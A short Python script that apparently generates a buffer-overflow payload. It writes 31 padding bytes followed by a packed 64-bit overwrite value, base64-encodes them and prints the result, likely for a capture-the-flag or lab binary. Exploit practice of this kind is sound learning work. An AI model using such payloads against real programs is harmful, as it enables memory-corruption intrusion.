
import sys
import struct
import base64

buf = b'sssssssssssssssssssssssssssssss'
buf += struct.pack('<Q', 10028754433436251926)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
